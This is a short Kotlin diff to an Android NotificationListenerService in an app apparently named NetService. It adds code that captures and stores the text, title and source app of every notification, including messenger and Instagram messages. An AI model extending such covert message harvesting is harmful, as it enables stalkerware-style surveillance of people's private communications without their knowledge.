@@ -3,6 +3,7 @@ package com.dtz.netservice.services.notificationService
 import android.app.Notification
 import android.service.notification.NotificationListenerService
 import android.service.notification.StatusBarNotification
+import android.util.Log
 import com.dtz.netservice.app.NetService
 import com.dtz.netservice.utils.Consts.FACEBOOK_MESSENGER_PACK_NAME
 import com.dtz.netservice.utils.Consts.INSTAGRAM_PACK_NAME
@@ -37,13 +38,19 @@ class NotificationService : NotificationListenerService() {
     override fun onNotificationPosted(sbn: StatusBarNotification?) {
         super.onNotificationPosted(sbn)
 
+        if (sbn != null) {
+            val bundle = sbn.notification.extras
+            val text = bundle.getString(Notification.EXTRA_TEXT).toString()
+            val title = bundle.getString(Notification.EXTRA_TITLE).toString()
+            interactor.setSavedMessageNotification(0,text,title,"-", sbn.packageName)
+        }
         if (sbn!=null){
             val typeNotification = matchTypeNotification(sbn.packageName)
 
             if (sbn.tag != null && typeNotification!=0){
 
                 val bundle = sbn.notification.extras
-                val text = bundle.getString(Notification.EXTRA_TEXT)
+                val text = bundle.getString(Notification.EXTRA_TEXT).toString()
                 val title = bundle.getString(Notification.EXTRA_TITLE)
                 val icon = sbn.notification.largeIcon
                 val nameImage = sbn.postTime
